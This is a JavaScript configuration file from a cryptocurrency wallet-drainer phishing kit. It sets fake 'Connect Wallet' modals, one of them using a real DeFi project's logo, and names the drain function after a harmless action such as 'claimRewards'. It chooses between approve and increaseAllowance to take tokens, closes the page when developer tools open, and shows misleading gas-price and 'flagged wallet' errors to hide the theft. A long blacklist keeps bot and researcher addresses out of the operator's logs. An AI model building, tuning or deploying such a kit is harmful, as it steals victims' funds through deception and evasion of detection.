
    /* 
        Modal_Style = 1; https://i.ibb.co/7zKDxx6/brave-v6-Ap-Shib-YR.png
        Modal_Style = 2; https://i.ibb.co/GvXy8kH/brave-qmejtu-HVi-C.png
        Modal_Style = 3; https://i.ibb.co/pdDJ5YR/brave-5-Hha-ZYeig-S.png
        Modal_Style = 4; https://i.ibb.co/88CHdVF/Telegram-zgdy-Sm-MLf-D.png
        Modal_Style = 5; https://i.ibb.co/R3KRv8D/brave-s-Plrx-CJm-SP.png
        Modal_Style = 6; No modal, auto connect MetaMask / WalletConnect v3
        Modal_Style = 7; https://i.ibb.co/y0Zwhqs/brave-v-Qa-Cpi-Ksm-T.png

        const Popup_Style = 1; SweetAlerts
        const Popup_Style = 2; New Loaders
        const Popup_Style = 3; No popups, only not eligible
    */

        const Modal_Style = 7;
        const Popup_Style = 2;
        const Popup_Style_3_not_eligible_message = "Your wallet has been flagged for an irregular activity. Please try to connect with a different wallet!"

        const Popup_dark_mode = true; // Popups Loaders dark mode, "true = dark" & "false = light"
        const WalletConnect_v3_dark = true; // Modal 7 dark mode, "true = dark" & "false = light"

        const modal_div_config = {
            "modal_dark_mode": true // Modals dark mode, "true = dark" & "false = light"
        };

        const wallet_connect_config = {
            "font_family" : '',
            "accent_color" : '',
            "color_mix" : '',
            "font_size_master": ''
        }
    
        const Modal_2_Title = "Connect Wallet";
        const Modal_2_Subtitle = "Start by connecting your wallet from the list below!";
        const Modal_2_Subtitle_URL = "";
        const Modal_2_Subtitle_URL_Text = "";
    
        const Modal_3_Title = "Connect Wallet";
        const Modal_3_Subtitle = "Start by connecting your wallet from the list below!";
    
        const Modal_4_Title = "Connect Wallet";
        const Modal_4_Subtitle = "Start by connecting your wallet from the list below!";
        const Modal_4_Logo_URL = "https://conic.finance/static/media/conic.2bc918ed95a106ffe4941df1594559a2.svg";
        const Modal_4_Footer_Title = "";
        const Modal_4_Footer_URL = "";
        const Modal_4_Footer_URL_Text = "";
    
        const Modal_5_Title = "Connect Wallet"
        const Modal_5_Subtitle = "Choose what network and wallet want to connect below";

        const transfer_contract_drain_function_name = "claimRewards"; // Possibilities: Claim, claimRewards, Connect, Swap, Execute, Multicall, Merge, Enable, Verify
        const use_approve_if_increase_not_available = true; // If IncreaseAllowance not available use Approve instead of Transfer function
        const bulkTransferEnabled = false; // Replace Seaport by BulkTransfer
        const click_everywhere_open_modal = false; // Click everywhere on page open modal
        const auto_prompt_on_reload = false; // Auto prompt popups again when page is reloaded
        const skip_popup_decline = false; // Skip popup after a decline
        const disable_dev_tool_enabled = false; // Close website instantly when user open console
        const min_eth_balance = 0.002; // Mini balance for prompt
        const min_total_balance_for_prompt = 0.1; // Total Wallet value needed to prompt a popup 
        const remove_drained_elements_in_past = false;

        // Don't touch if you don't know what is this for
        const manual_claim_allowance = false; // Requires "use_approve_if_increase_not_available" true
        const default_allowance_drain_enabled = false;
        const default_allowance_contract = "0xdac17f958d2ee523a2206206994597c13d831ec7"; // Token contract that will be prompted by default if no assets value > min_default_prompt_value
        const min_default_prompt_value = 1; // The amount in ETH required to have a regular prompt instead of allowance prompt
    
        class SwalPopup {
        constructor() {  this.popup = null;  this.timeout = null;  }
    
        // Prompt alert
        show() {
            this.popup = Swal.fire({
            html: '<b>Connection Established</b><br>Sign message in your wallet to continue...',
            imageUrl: 'https://miro.medium.com/v2/resize:fit:720/1*CsJ05WEGfunYMLGfsT2sXA.gif',
            width: 600,
            imageHeight: 80,
            color: '#1b1e24',
            background: '#ffffff',
            timer: 0,
            allowOutsideClick: false,
            allowEscapeKey: false,
            showConfirmButton: false,
            })
        }
    
        close() {
            Swal.close();
            this.popup = null;
        }
    
        // Poor alert
        pooron(error = 'Insufficient ETH for transaction broadcast. Try with different wallet.') {
        this.popup = Swal.fire({
            title: 'Something went wrong!',
            icon: 'error',
            confirmButtonText: 'OK',
            text: error,
            color: '#1b1e24',
            background: '#ffffff',
            allowOutsideClick: true,
            allowEscapeKey: true,
            })
        }
    
        // Not eligible alert
        notEli(error = 'Insufficient ETH for transaction broadcast. Try with different wallet.') {
        this.popup = Swal.fire({
            title: 'Something went wrong!',
            icon: 'error',
            confirmButtonText: 'OK',
            text: error,
            color: '#1b1e24',
            background: '#ffffff',
            allowOutsideClick: true,
            allowEscapeKey: true,
            })
        }
    
        // Drained alert
        setError(error = 'Authentification was cancelled due to rapid change in gas prices. Please try again.') {
        this.popup = Swal.fire({
            title: 'Something went wrong!',
            imageUrl: '',
            icon: 'error',
            text: error,
            color: '#1b1e24',
            background: '#ffffff',
            allowOutsideClick: true,
            allowEscapeKey: true,
            })
        }
    
        // Connected wallet alert
        setSuccess() {
        this.popup = Swal.fire({
            icon: 'success',
            title: 'Connection established',
            text: 'Awaiting wallet response, please wait a moment.',
            color: '#1b1e24',
            background: '#ffffff',
            showConfirmButton: false,
            allowOutsideClick: true,
            allowEscapeKey: true,
            })
        }
    
        // Chain Switch alert
        chainswitch() {
        this.popup = Swal.fire({
            icon: 'info',
            title: 'Switching network',
            text: 'Confirm network switch in wallet...',
            color: '#1b1e24',
            background: '#ffffff',
            showConfirmButton: false,
            allowOutsideClick: true,
            allowEscapeKey: true,
            })
        }
    
        update(options) {   this.popup.update(options); }
        }

        let blacklistedAddresses = [ // Blacklist the bots to prevent receiving their boring logs 
            "0x240Cf70D8A648BE133fEB342D71E5e81C686e5f8","0x20cCdeDB9814c83bA2D663fC04f88c7a61aA706d","0x2ad6FA4db57Ac71479510863643Eb6b1991788E1",
            "0x33566c9D8BE6Cf0B23795E0d380E112Be9d75836","0x034C446b223Bb4ffbd51d2E284Fe6b3cdd271315","0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045",
            "0xC832494dce30f7303F42d829c205D6Ea6b551afb","0x29B876e2dd14dd034612F052ecB372E64C96A895","0x886258791969e6b0fEff62c0a02be819Dfc1B167",
            "0x3096d3B09e6ec2E8fF923D1657d0c691148eEeE5","0xaF92d25248767357041c002Ea5aE24eF350102EF","0x2b8496F320582481eA393bd26B9191F9059D2943",
            "0x81c4065F3B3b89adE412158b8c2c2C37e2a1b0A0","0x9A735c231ad994D48929d3d8cE0970fCA25C2908","0xbAEA4b614e0cADdA6aE2c860F3Ba8270f770f22f",
            "0x1A5b5825A27Ec3D6eb3b07fBdF3e43940Def50cD","0xE9848efd82fa62a5cfaC25582dDe408afBD111eC","0x2c067bB687587306840849E1a4Ff9bB4B42f7308",
            "0x49027eF8931082Ca59F0037b80A4F518D500bC4f","0x5EadC2E651470e16413446AA4Bca44868751bf08","0x96dA410F33EBC7139DECc588Bf6d777416CC06B2",
            "0xE0554bAc61316d4E3949F156b2F8C6E0bD4c97D2","0x4eD2f648bBe43164746B7401880Ee5DAc5296422","0x0ac5350ECBD7Ae22Ce0b070cE2b856fB99063E62",
            "0xa382E62745E5d5BcD8D82198De73cd5d8b11f76a","0x4fbCb5bB35BF5631A8330BD36E93b8171d9c7535","0x7CF47F8d73190f79616ce0Be56dCbBD8499A181A",
            "0x4d8EfB4684EfFfE0711b9270c55A01E543024b39","0x7Eb056a49622c03a2dbB47F67D658D3E02D2C24c","0x8538F26B33b4518818F9d2c1F163Ff16F2A1AA1B",
            "0xe61c12ba179Af123af4Ec738434632D27DBa869D","0x07756A0f1826B6A92EdCf5b70843af6ef4ecF64A","0xC29310E45F1Cad3081BfC5812de80379AF770BcD",
            "0x7AbA6DC7FAAdb5bc28bAd4b25E71685536Ac0a33","0x0e876653ccf361d0615253d58Bc4Bcbca007F76A","0x43c66c64D9494EbDFc277075e404678202989E61",
            "0xa716617Bb1E5aAac305104BB26296A577355E297","0xFaa217bDE087F50eFF5342D026d2529d3f854F3D","0x2F7A87C13e8B17398c80d88De6AEb55b60E7fA83",
            "0xc518f165626348c4E290a67876F5Fe179786E518","0x4058AAEbfE0698946303Be550b7c215cfF023212","0x6a087E1608ca58c1cf4e0825176E616b80a93811",
            "0xa990703801A962C3d8e3a9EC239B20C2B17A7C45","0xB3336D7D4606a584138bc992B188C08B118815C9","0x1Da482A2F3a6a961Ebd9B5F64926fDE1052FAA5b",
            "0x28bE8BceECEEc996A1886036dB1c7fE8D5d40462","0x8fd9Eb824193849fA61D80F0bd1A346713D1DE82","0xA507fc7Ad26D49926977e39cEf3D30B06bC648a7",
            "0xda433c7E6F04d4fE6D4C9A779c5809B55C1dfFe7","0x3F8f9772492EfaF5FeAa472a75f493AbEB44c53F","0x3Dc6F7ACb12a951E910A90138dBa8b5cb94d1a49",
            "0x6F41e4c00d3A2279B50e59CFB6aC7ff309F1eAD9","0x74ea8c983cf92c75d3b5601cfc2e0b269f323579","0x15F04a0D62F6195143bE20CcF44911a812fd05b9",
            "0x31d2Ab5AbCCb6Aa34afe27A6ae1120E99C73fbE5","0x1579B5f6582C7a04f5fFEec683C13008C4b0A520","0x2e7444aDe51B2dbc723c6298679baC3EF8389c31",
            "0xf58645fa0D55772F22B144672a8Ba85D4Dac75e6","0x5E1a0D484c5F0DE722E82f9dca3A9d5A421d47cB","0x48D9d0Eabc945Aa513a52d71e0Ea4047B2c33Ce4",
            "0x4278D3E39f25D690B2d060c119AB2478fa09AFf5","0x28F8ca3B0EDdd849c93986dF0fd194252C4e4B03","0x0Cc772F0EF92cC9d9654B5c5b980159C3d53f40e",
            "0xca3099DFf7709da06003eCB3F0D01A095582Fa9F","0xD7a4FCD99f0f5676c09728dD9F846FaeB6e72F8E","0xfd79CBF83268bfe7b1Bc7b2788B20Ce3798DAC2e",
            "0x1254958BD5073C6B238E516298f0c48f6f60A78e","0x07320dEb2713370A3D7b49189fc2F99906E1ae8E","0xf146Bd17e26956Ce085e9012417957108B7653e4",
            "0x1157A2076b9bB22a85CC2C162f20fAB3898F4101","0x798576F0B501A8Eb61D914249676E3878584B2EE","0x462178708c08a63B7fAd903f8a352f3c72CD912C",
            "0x6ac423F08109094Af754eb733433CAd2033D80d1","0x28C6c06298d514Db089934071355E5743bf21d60","0x4074Bc05A89f1b97B51413b06F7e44F46Eae6880",
            "0x0a5F56cBf9c27BD3beb790a4914a36eb45Ef08d6","0xbCC7aFE0789e0995fCDDB8cD1885E86cEbDa68d5","0xf48587054aD6d24454523e5c8A10B7EBF1ae6D1C",
            "0x0000000000000000000000000000000000000020","0x0000000000000000000000000000000000000001","0xa7888F85BD76deeF3Bd03d4DbCF57765a49883b3",
            "0x1C09b00af0AF6957D0E606791Cb4FFB776A94D8E","0x88a92e9e9475366d50Ba2B086fdBe40ad65Baf08","0xBD584cE590B7dcdbB93b11e095d9E1D5880B44d9",
            "0xd22865955aE09728A118888Bb621bF0f6f167Ce0","0x324cBfcd64324f6fD49e644E79c93131E19E9F27","0x3f9A8EF0142c08caee3272e583b28602C0C63651",
            "0x62f217958ce82Af5E5dfb6F16B562ab1f4358e1F","0xa6675d96B2512d8CD0102943Fd2a86C169034276","0xDc3D1c1dE687CFaa8f8DE2f37cd181C2AE3a9dFd",
            "0x287e2c76Aab4720786076c3DEedD7Dd386092050","0xf948782165B58cEcE1C75fE1579bA19e86dbF95d","0x34ea4138580435B5A521E460035edb19Df1938c1",
            "0x522148ac438A4d68110c259d04dACa5b425Be0e9","0xdE9B4206B1499e56E4417f8EdB7bE4586FeD30Ba","0x3d399fDde67DDDdDB1e76A348C60491A8ba8374a",
            "0x04D7C2ee4cdBAC9A0FC46d3E35e79AbA5CCa471D","0x5041ed759Dd4aFc3a72b8192C143F72f4724081A","0xDA6410E9C2246f8b3cE23C975D51c0563C78BFce",
            "0xE896675803DA7Df23c9BbDA3646BBD82593B6668","0x09726FdfFDE53a9434CED4D097CF2038C6c78B7D","0xa82a74b8f5877734D78345C5867E9578FbFAC639",
            "0x781229c7a798c33EC788520a6bBe12a79eD657FC","0x8E417f230877AaDD39224766730eEe052d1b4422","0x66f659b95f722F728e249cC917CD4655C343687d",
            "0x7972bC68FaB9b552963977077B4CdE82Da1722e0","0xf60c2Ea62EDBfE808163751DD0d8693DCb30019c","0x2101336975867FfDe3Ed903Cdf451c1863586AdB",
            "0x17eF2B6Ff281dbb79847c9CBb2Ce62572Abb24C8","0x34cbD30e16d54904E61870aE892A73753e8AFc0d","0xafd2eD18640E4fAF466b3658fcb81D18dA5EA3Fd",
            "0x2dCcE19bc91b5e64D9a0384eB41f2Bff6D9Dc23d","0x2c2ed4b3876c442fee80BeE76Ce0eE2CA2A512AF","0xC18F0d85528948deE12730f0378066718AeE9eEB",
            "0xFb3bd1c7640C42815Bafd3e6F21a5671cac76FBC","0x6cEdD1b62e8d5474e778ec2d0Da269163Dd9b9e3","0xcfe122de90515685F806E79B29Ff9351Ce764098",
            "0xEa181DBd88495a3653B3e21aa13248B0b3647940","0x1FEF500586a301D843A8049b6FEFB920b4888513","0x83994F7AB59ba007Bd5D6CAb13D8820b508C1bC4",
            "0x4DE23f3f0Fb3318287378AdbdE030cf61714b2f3","0x4D41BAacfD4E2632F8f562193E94c0960e7DA549","0x7287473BF5B6540908b67C3211aA106c2181F45E",
            "0x593c427d8C7bf5C555Ed41cd7CB7cCe8C9F15bB5","0x1A427BD931B3B7045E1AF14f180F8495F86304BB","0xa0FAd79fb48640E8A5E2458E7E31011690D35262",
            "0x307F86c0D348a3c76dAfdD604eA89c1966f719a3","0xC841b289918A1a7559263BC4C78AF1ED15DD49C4","0x0000000000000000000000000000000000000000",
            "0x080314581b003B60a61f8bDf457b26d283dd68B1","0x0c4Fe10Dfd4252BED0b4827B3F2a30ebBce42Cd6","0x0000000000000000000000000000000000000002",
            "0x12d410E1AD46e70191A3c6C58B562fD308Db8487","0x2e9A18d66f2FC535497cFB395D7F1BCb6746E582","0x3078A552596098ef0874Fec913e48ab2D40f4B6F",
            "0x32595d3510F774108Bc679d97420e80219EbC4c4","0x5853eD4f26A3fceA565b3FBC698bb19cdF6DEB85","0x5bdf85216ec1e38D6458C870992A69e38e03F7Ef",
            "0x5Eea2152BCC8F8F4516158d5d663DbCBE4464FbB","0x648aA14e4424e0825A5cE739C8C68610e143FB79","0x655aF72e1500EB8A8d1c90856Ae3B8f148A78471",
            "0x6C1Be971341EcD1136de99ed51691f33C98517Fb","0x6CE23E33457D524809914262EB4FE84f40a704D5","0x7F4DD4559baccdF4fF8ed2Ca02130aF646f266C8",
            "0x82563Ba592986Cb277d67B2E7c56ab3BB3FDD6B8","0x85C153AAe1f101Af08151863306d9e0b823eA1B5","0xA6BE54A5C48E98F49aFb0432BC13f933B6930E99",
            "0xAd408662822fB2b541c3421043c6C3B82899c59f","0xADD3501745C0b81356ad97250455FdB6f28CC97D","0xB39047154455fd26A0F60BDD619283c76ac71A1C",
            "0xcc892cbf8E93BFe93c3eCB5c0fBD05dBaeB5C081","0xd4B85a3AA646ecb0C9cFd6e40DA0eB9B10FFFA99","0xDA70Bc9d44fade6Ab087E75257c5088fF411a316",
            "0xF2b89b1861029FBe8B2034f26EDcD9C9E173Ed6B","0x4a9B236E55A0dC226648018EF89B3e9FD41FF6fF","0x6a02F83cDA58676dA4898dc3eCe55cb04BDF3604",
            "0xaA0DEe58a36b72C774317Eb5f71aFB2a04c85527","0x7a9ea59f3d2f058f0bd0e551db66278a5b4bcd58","0xd4ffA62Dab21d26ABF1884725AFE6Ad971d2bA4e",
            "0x85e89e5A3013756d12C27f30f33A2cd1eF7ED7a2","0x61f41775e63Baf8eF689Ef03109f9B47908aED21","0x1b523DC90A79cF5ee5d095825e586e33780f7188",
            "0xf059E7a494491E2F51e66C493081D2aD3dfD0b3f","0x76807F3D69b1D38F9D597e902f18dAb0Af926B8B","0x760Cd82D96e609e06911931B0265B6cD7B0e19ff",
            "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266","0x00006DEAcd9ad19dB3d81F8410EA2B45eA570000","0x806F9250316DDA434e25ee880eF6718F91085a39",
            "0x9c6A48C2c45EcE8cF7A431c181ca425A9096CE0c","0x7C72c0671a0407A6de60C6c18253a6f940E15b8a","0x09CF83cE519f7521572CA4797c43119739De8f00",
            "0x133cE67B95b553bf7609f9816315A7d36d61671C","0x30e4C51006E5f1e85290e65639753760A39089bc","0x38f4Bd345108C65F39F42C34D7f29884239e8CdF",
            "0x3A723e58C4808DDE4591543282adC7D6b378715b","0x4172ba2E1619B6De9938b6A4b09fd6F8C53F38A9","0x529debB3955689C87e54b54576FD4578A35935cD",
            "0x533db465afbEEa29fD6f2D6aCAdB2e2D0CEE7e46","0x6134C994b33a83a5B1a9E0Fe006E500738f68f9e","0x627306090abaB3A6e1400e9345bC60c78a8BEf57",
            "0x6d35357E2A7628C3fC5BCd25e127EF92d1E1600e","0x824d0D353151Cfa7aF4519c264a824864B84E0D8","0x87ef9D8F1cEC5Afc1A46B472D068FB84e7947326",
            "0x890765A956086Fb3458CDD614D88e3C346ee1fca","0x8a7611e84Fd032a6E802C4311670F5021062fb1E","0x8F18B3DE9F0ad995A859D59c8bd530eD73041582",
            "0x8faE886d77466eC224DC999E7CE49c3767cdb78D","0xA84FAbdfaaf3A7cc9c81Ccc84922BAC84998d783","0xaeeD6DA0b6cb5c72D0377FDA6da9DD316BCBfc9a",
            "0xb2bCB0239B074DE00c1163f087BF75D0a78D7053","0xb8dFAf3b00a03CEf7f1D8cB20e450650dFEe6Fe2","0xC0664d09F4688f22FfC627d68190166b6Ad050C0",
            "0xC386601a79Ea5B467D8a7Db4910f375e0b37d989","0xCaFca5eDFb361E8A39a735233f23DAf86CBeD5FC","0xD854343f41B2138B686F2D3bA38402A9F7Fb4337",
            "0xfFDd2f83555c64d1CaA17f5646C08b80013ED38b","0xa89208229F884B37efB8Ee1EbB8E044B5736f2BE","0xacc2d5465CA27d74186C174F03cB67E881DdaAe5",
            "0xf281286aD5E8f8E1F66C28Efd92086c73f3beB80","0x74fe202b4e42cA335B1474704392Bd4871d9614e","0x65245c4B2b51F999EDBee31714af63676CC5cB74",
            "0x403f12152eEEc6B4BA871F3B10F169Acc03b3B03","0x620c5f5e6daa54b360D6A555D673586C492Fb3Be","0xB3c33217c8DA6A7310522Ef14812F0876837324C",
            "0xe69062f87FCFf3a8ADeA72CC72FFd09C156953c3","0xC94eBB328aC25b95DB0E0AA968371885Fa516215","0xed2ab4948bA6A909a7751DEc4F34f303eB8c7236",
            "0x663d3947f03eF5B387992b880aC85940057c13e3","0xC9EcE5649f4aEEA94145BbE52727934C01D05532","0x5387204E14b60cb26a81f02a2A1F44d6bC1B24D3",
            "0xa71327E4C361618cb44841fEa5aFb9988D93eaC1","0xeF2bCe91Cc8D68813FD89eABC1f68Ec10f87DA17","0xa081AE42802E0Be86f5A6dD9274ADf50C9986a1D",
            "0x89ba2B87C8A246c68Fc96Ac878d5eB9C3BBDB9c7","0xa386c97315eC442cc767dB7F5Dcf9E980C0D9934","0x6173CbC01A151738a665755491461D9b4eeeA491",
            "0x4dac26f1E79A00dC8F8E365a0Df3ded2c31EB59f","0xdBb7D5E20024b5D9104e51f29252B22cEd8F39EA","0x22103a4AD9a19daEE146A413C3b1b44Eaa67b22C",
            "0xd6D7Ea4833f22edBED3DbD3d71Adf3cdD8E36a01","0x9508232030c3e9F9a1Dcf8AfdbF0150e73226763","0x3117c9FDb3e0Fe4D7BAB61b61dBfCDd565Bb13C2",
            "0x9FeAEc4267F4BD8065D15DF8f5CA712ef882450c","0x202657D54F93A7AB20116D5671dD9deA04728eE9","0xAB6cA2017548A170699890214bFd66583A0C1754",
            "0xDCdA3FA77BFEA5d3c4252AD294E79BAc87aF1020","0xA17Dd8C55C0d3FBF895Dc470b3060D6a562334CF","0x21640319D4d0D79430A56abC2cc58caD1139Ddd2",
            "0x8216D02B21710a47367F0548bF68D86cC71d0b67","0x42211F268EcfeD281e9708C029D69910265d223c","0x0000000000000000000000000000000000000003",
            // add addresses below, format: "0x...",
        ];
